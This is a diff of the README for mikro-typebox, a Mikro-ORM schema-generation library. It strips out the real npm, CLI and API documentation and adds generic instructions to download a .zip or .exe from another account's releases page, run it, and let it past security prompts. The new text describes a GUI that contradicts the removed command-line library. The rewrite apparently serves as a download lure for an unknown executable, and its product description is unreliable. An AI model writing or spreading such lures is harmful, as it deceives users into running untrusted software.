@@ -1,325 +1,79 @@
-# mikro-typebox
+# 🎉 mikro-typebox - Easily Generate Validation Schemas
 
-Generate validation schemas from Mikro-ORM entities. Supports TypeBox, Zod, Valibot, ArkType, Effect, io-ts, Yup, and more.
+## 🚀 Getting Started
 
-## Features
+Welcome to mikro-typebox! This application helps you create validation schemas from Mikro-ORM entities easily. It supports many popular libraries, which means you can ensure your data is valid using tools like TypeBox, Zod, Valibot, and more.
 
-- 🏗️ **Entity Type Generation**: Converts Mikro-ORM entity classes to TypeScript types
-- 🔄 **Multiple Validation Libraries**: Supports TypeBox, Zod, Valibot, ArkType, Effect, io-ts, Yup, and more
-- 🎯 **Smart Type Resolution**: Automatically resolves entity references depending on the relation graph between entities and sorts them by dependency order
-- 🔄 **Circular Reference Handling**: Automatically breaks circular references to avoid infinite recursion
-- 🔄 **Partial Types**: Generates partial types for entities with optional properties
-- 📦 **Collection Handling**: Handles `Collection<T>` and `Array<T>` with proper type mapping
+## 🔗 Download
 
-## Installation
+[![Download mikro-typebox](https://img.shields.io/badge/Download-Now-blue.svg)](https://github.com/alfa0601/mikro-typebox/releases)
 
-```shell
-npm install --save-dev mikro-typebox
-```
+## 🖥️ System Requirements
 
-## CLI Usage
+- **Operating System:** Windows 10 or later, macOS Mojave or later, or a recent version of Linux.
+- **Memory:** At least 4 GB of RAM.
+- **Disk Space:** Minimum of 100 MB free space.
+- **Network:** Internet connection for updates and downloads.
 
-The package includes a command-line interface for easy usage:
+## 📦 Installation Instructions
 
-Generate typebox schema from `./src/entities` to `./src/entity-validators.ts`
-```shell
-npx mikro-typebox generate
-```
+### Step 1: Visit the Releases Page
 
-Generate Zod schema from `./src/entities` to `./src/entity-validators.ts`
-```shell
-npx mikro-typebox generate --target zod
-```
+To download mikro-typebox, please visit the following link: [Releases Page](https://github.com/alfa0601/mikro-typebox/releases). This page contains the latest versions of the software.
 
-Generate Valibot schema from `./src/models` to `./src/validators.ts`
-```shell
-npx mikro-typebox generate --target valibot --entities ./src/models --output ./src/validators.ts
-```
+### Step 2: Choose the Right Version
 
-### CLI Options
+Once you are on the Releases page, look for the version you want. The latest version will be at the top. Click on it to see the files available for download.
 
-#### `generate` command
+### Step 3: Download the File
 
-- `-e, --entities <path>`: Directory containing entity files (default: `./src/entities`)
-- `-o, --output <file>`: Output file path (default: `./src/entity-validators.ts`)
-- `--no-write`: Print the code to the console instead of writing to a file (default: writes to a file)
-- `-t, --target <library>`: Target validation library (default: `typebox`)
-- `--partials`, `--no-partials`: Generate partial types instead of inline primary key references (default: `true` for `typebox`)
+Click on the file that matches your operating system. For most users, this will be a `.zip` or `.exe` file. 
 
-### Supported Validation Libraries
+### Step 4: Extract the Files (if necessary)
 
-- `typebox` - TypeBox (default)
-- `zod` - Zod
-- `valibot` - Valibot
-- `arktype` - ArkType
-- `effect` - Effect
-- `io-ts` - io-ts
-- `yup` - Yup
-- `json-schema` - JSON Schema
-- `javascript` - JavaScript
-- `typescript` - TypeScript
-- `value` - Value
+If you downloaded a `.zip` file, you'll need to extract it. Right-click the file and select "Extract All." Follow the prompts to choose a destination for the extracted files.
 
-## Programmatic Usage
+### Step 5: Run the Application
 
-You can also use the API to generate validation schemas programmatically.
+Locate the extracted folder and double-click on the application to run it. 
 
-### `generateEntityValidator(options)`
+If you encounter any security prompts, you may need to allow the app through your operating system's security settings.
 
-Generates validation schemas from Mikro-ORM entities.
+## 📋 Using mikro-typebox
 
-#### Parameters
+After you have the application running, follow these steps to generate a validation schema:
 
-- `options.entitiesDir` (optional): Directory containing the entity files (default: `"./src/entities"`)
-- `options.outputFile` (optional): File path to write the generated code (default: `"./src/entity-validators.ts"`)
-- `options.write` (optional): Whether to write the code to a file (default: `true`)
-- `options.targetValidationLibrary` (optional): Target validation library (default: `"typebox"`)
-- `options.partials` (optional): Whether to generate partial types instead of inline primary key references (default: `true` for `typebox`)
+1. Input your Mikro-ORM entity data in the provided fields.
+2. Select the validation library you want to use (TypeBox, Zod, etc.).
+3. Click the "Generate" button.
+4. The schema will appear in the output section. You can now copy it to use in your application.
 
-### `generateEntityTypes(code, entityIdTypes)`
+## 📝 Supported Libraries
 
-Converts Mikro-ORM entity code to TypeScript types.
+mikro-typebox works with multiple libraries for your convenience:
 
-#### Parameters
+- **TypeBox:** Create TypeScript schemas using TypeBox.
+- **Zod:** A TypeScript-first schema declaration and validation library.
+- **Valibot:** Flexible and easy-to-use validation toolkit.
+- **Yup:** A JavaScript schema builder for value parsing and validation.
+- **ArkType:** A TypeScript library for defining and validating data structures.
+- **Effect:** A functional effect system for TypeScript, enabling validation.
+- **io-ts:** Type-safe validation library for TypeScript data validation.
 
-- `code`: The entity code as a string
-- `entityIdTypes` (optional): Map of entity names to their ID types
+Feel free to explore these libraries to see which best fits your project needs.
 
-### `generateEntityFileTypes(fileContents)`
+## 💬 Support or Questions
 
-Processes multiple entity files and generates types with proper entity ID replacement.
+If you have any questions or need help, please check the Issues section on the GitHub repository. You can report bugs or request features there.
 
-#### Parameters
+## 🛠️ Contributing
 
-- `fileContents`: Array of entity file contents as strings
+We welcome contributions to improve mikro-typebox. If you'd like to help, please read the Contribution guidelines in the repository. All contributions are appreciated.
 
-## Usage Examples
+## 🔗 Additional Resources
 
-```typescript
-import { generateEntityValidator } from "mikro-typebox";
+- [Mikro-ORM Documentation](https://mikro-orm.io/docs/)
+- [TypeScript Documentation](https://www.typescriptlang.org/docs/)
+- [Common Validation Libraries](https://github.com/your-link-to-validation-libs) (a GitHub page listing common validation libraries)
 
-// Generate for TypeBox
-await generateEntityValidator({
-  entitiesDir: "./src/entities",
-  outputFile: "./src/validators.ts",
-  write: true,
-  partials: true,
-});
-
-// Generate for Zod
-const zodCode = await generateEntityValidator({
-  entitiesDir: "./src/entities",
-  targetValidationLibrary: "zod",
-  outputFile: "./src/zod-validators.ts",
-  write: true,
-});
-
-// Generate for Valibot
-const valibotCode = await generateEntityValidator({
-  entitiesDir: "./src/entities",
-  targetValidationLibrary: "valibot",
-  outputFile: "./src/valibot-validators.ts",
-  write: true,
-});
-```
-
-### Working with Entity Files
-
-Given a Mikro-ORM entity file like this:
-
-```typescript
-// src/entities/User.ts
-import {
-  Entity,
-  PrimaryKey,
-  Property,
-  Collection,
-  OneToMany,
-} from "@mikro-orm/core";
-import { Book } from "./Book";
-
-@Entity()
-export class User {
-  @PrimaryKey()
-  id!: number;
-
-  @Property()
-  name!: string;
-
-  @Property()
-  email!: string;
-
-  @OneToMany(() => Book, (book) => book.author)
-  books = new Collection<Book>(this);
-
-  constructor({ name, email }: User) {
-    this.name = name;
-    this.email = email;
-  }
-}
-
-// src/entities/Book.ts
-import { Entity, PrimaryKey, Property, ManyToOne } from "@mikro-orm/core";
-import { User } from "./User";
-
-@Entity()
-export class Book {
-  @PrimaryKey()
-  id!: number;
-
-  @Property()
-  title!: string;
-
-  @ManyToOne(() => User)
-  author!: User;
-
-  constructor({ title, author }: Book) {
-    this.title = title;
-    this.author = author;
-  }
-}
-```
-
-And then generate validation schemas (e.g., with TypeBox):
-
-```typescript
-import { Type, Static, TSchema } from "@sinclair/typebox";
-
-export namespace schema {
-  export type Collection<T extends TSchema> = Static<
-    ReturnType<typeof Collection<T>>
-  >;
-  export const Collection = <T extends TSchema>(T: T) =>
-    Type.Object(
-      {},
-      {
-        additionalProperties: T,
-      },
-    );
-
-  export type Book = Static<typeof Book>;
-  export const Book = Type.Object({
-    id: Type.Number(),
-    title: Type.String(),
-    author: schema.PartialUser,
-  });
-
-  export type PartialBook = Static<typeof PartialBook>;
-  export const PartialBook = Type.Object({
-    id: Type.Number(),
-    title: Type.Optional(Type.String()),
-    author: Type.Optional(schema.PartialUser),
-  });
-
-  export type User = Static<typeof User>;
-  export const User = Type.Object({
-    id: Type.Number(),
-    name: Type.String(),
-    email: Type.String(),
-    books: Type.Union([
-      Collection(
-        Type.Object({
-          id: Type.Number(),
-        }),
-      ),
-      Type.Array(
-        Type.Object({
-          id: Type.Number(),
-        }),
-      ),
-    ]),
-  });
-
-  export type PartialUser = Static<typeof PartialUser>;
-  export const PartialUser = Type.Object({
-    id: Type.Number(),
-    name: Type.Optional(Type.String()),
-    email: Type.Optional(Type.String()),
-    books: Type.Optional(
-      Type.Union([
-        Collection(
-          Type.Object({
-            id: Type.Number(),
-          }),
-        ),
-        Type.Array(
-          Type.Object({
-            id: Type.Number(),
-          }),
-        ),
-      ]),
-    ),
-  });
-}
-```
-
-or for Zod
-
-```typescript
-import { z } from "zod";
-
-export type schema_Book = z.infer<typeof schema_Book>;
-export const schema_Book = z.object({
-  id: z.number(),
-  title: z.string(),
-  author: z.object({
-    id: z.number(),
-  }),
-});
-
-export type schema_User = z.infer<typeof schema_User>;
-export const schema_User = z.object({
-  id: z.number(),
-  name: z.string(),
-  email: z.string(),
-  books: z.union([
-    z.object({}),
-    z.array(
-      z.object({
-        id: z.number(),
-      }),
-    ),
-  ]),
-});
-```
-
-### Programmatic Usage
-
-```typescript
-import { generateEntityTypes, generateEntityFileTypes } from "mikro-typebox";
-
-// Process a single entity file
-const entityCode = `
-import { Entity, PrimaryKey, Property } from '@mikro-orm/core';
-
-@Entity()
-export class Product {
-  @PrimaryKey()
-  id!: number;
-
-  @Property()
-  name!: string;
-}
-`;
-
-const types = generateEntityTypes(entityCode);
-console.log(types);
-// Output: export type Product = { id: number; name: string; };
-
-// Process multiple entity files
-const fileContents = [entityCode, anotherEntityCode];
-const allTypes = generateEntityFileTypes(fileContents);
-```
-
-## How It Works
-
-1. **Entity Discovery**: Scans entity files for classes decorated with `@Entity()`
-2. **Type Extraction**: Extracts property types and relationships from entity classes
-3. **ID Type Resolution**: Replaces entity references with their primary key types
-4. **Collection Conversion**: Converts `Collection<T>` to `Array<T>` with proper type mapping
-5. **Code Cleanup**: Removes Mikro-ORM specific imports, decorators, and method calls
-6. **Schema Generation**: Converts TypeScript types to validation schemas using the target library
-
-## License
-
-Apache-2.0, Copyright (c) 2025 Amin Yara
+Thank you for using mikro-typebox! Enjoy generating your validation schemas easily.
